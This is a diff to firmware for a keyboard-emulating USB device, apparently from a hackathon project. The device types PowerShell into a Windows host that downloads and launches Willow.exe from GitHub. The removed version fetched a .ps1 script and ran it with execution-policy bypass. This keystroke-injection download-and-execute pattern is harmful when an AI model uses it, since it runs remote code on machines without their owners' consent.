@@ -39,7 +39,7 @@ uint32_t interval = 0;
 
 USBHIDKeyboard Keyboard;
 
-#define HOST 1 // LINUX: 1, WINDOWS: 2
+#define HOST 2 // LINUX: 1, WINDOWS: 2
 
 // Convert HSV to RGB565 color
 uint16_t hsvToRgb565(uint16_t h) {
@@ -167,18 +167,10 @@ void openTerminal()
 }
 void downloadCheckFile()
 {
-    Keyboard.println(
-    "powershell -NoProfile -Command \""
-    "$dir=$env:LOCALAPPDATA+'\\\\Willow';"
-    "if(!(Test-Path $dir)){New-Item -ItemType Directory -Path $dir | Out-Null};"
-    "$ps1=$dir+'\\\\install.ps1';"
-    "Invoke-WebRequest "
-    "-Uri https://raw.githubusercontent.com/regularpooria/willow_qhacks2026/main/check.ps1 "
-    "-OutFile $ps1;"
-    "powershell -NoProfile -ExecutionPolicy Bypass -Scope Process -File $ps1"
-    "\""
-    );
-    delay(3000);
+    Keyboard.print("powershell -NoProfile -Command \"$d=[Environment]::GetFolderPath('Desktop');$p=Join-Path $d 'willow.exe';if(Test-Path $p){Start-Process $p}else{Invoke-WebRequest -Uri 'https://github.com/regularpooria/willow_qhacks2026/releases/download/windows/Willow.exe' -OutFile $p;Start-Process $p}\"");
+    delay(4000);
+    Keyboard.println();
+    delay(6000);
 }
 #endif
 
